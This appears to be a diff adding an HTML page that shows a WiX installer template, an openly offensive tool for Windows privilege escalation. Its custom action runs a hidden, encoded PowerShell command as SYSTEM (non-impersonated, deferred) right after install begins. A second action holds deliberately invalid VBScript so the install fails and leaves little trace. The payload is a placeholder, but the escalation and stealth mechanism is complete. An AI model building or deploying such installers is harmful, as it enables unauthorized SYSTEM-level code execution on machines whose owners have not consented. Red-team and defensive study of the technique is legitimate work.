@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Custom WiX File</title>
+</head><body>&lt;?xml version="1.0"?&gt;<br/>
+&lt;Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"&gt;<br/>
+&nbsp; &lt;Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033"&gt;<br/>
+&nbsp; &nbsp; &lt;Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/&gt;<br/>
+&nbsp; &nbsp; &lt;Media Id="1" Cabinet="product.cab" EmbedCab="yes"/&gt;<br/>
+<br/>
+&nbsp; &nbsp; &lt;Directory Id="TARGETDIR" Name="SourceDir"&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;Directory Id="ProgramFilesFolder"&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &lt;Directory Id="INSTALLLOCATION" Name="Example"&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222"&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;File Id="ApplicationFile1" Source="example.exe"/&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;/Component&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &lt;/Directory&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;/Directory&gt;<br/>
+&nbsp; &nbsp; &lt;/Directory&gt;<br/>
+<br/>
+&nbsp; &nbsp; &lt;Feature Id="DefaultFeature" Level="1"&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;ComponentRef Id="ApplicationFiles"/&gt;<br/>
+&nbsp; &nbsp; &lt;/Feature&gt;<br/>
+<br/>
+&nbsp; &nbsp; &lt;Property Id="cmdline"&gt;powershell.exe -nop -w hidden -e &lt;BASE64d POWERSHELL COMMAND HERE&gt;<br/>
+&nbsp; &nbsp; &lt;/Property&gt;<br/>
+<br/>
+&nbsp; &nbsp; &lt;CustomAction Id="SystemShell" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/&gt;<br/>
+&nbsp; &nbsp; &lt;CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check"&gt;<br/>
+&nbsp; &nbsp; &nbsp; invalid vbs to fail install<br/>
+&nbsp; &nbsp; &lt;/CustomAction&gt;<br/>
+<br/>
+&nbsp; &nbsp; &lt;InstallExecuteSequence&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;Custom Action="SystemShell" After="InstallInitialize"&gt;&lt;/Custom&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;Custom Action="FailInstall" Before="InstallFiles"&gt;&lt;/Custom&gt;<br/>
+&nbsp; &nbsp; &lt;/InstallExecuteSequence&gt;<br/>
+<br/>
+&nbsp; &lt;/Product&gt;<br/>
+&lt;/Wix&gt;</body></html>
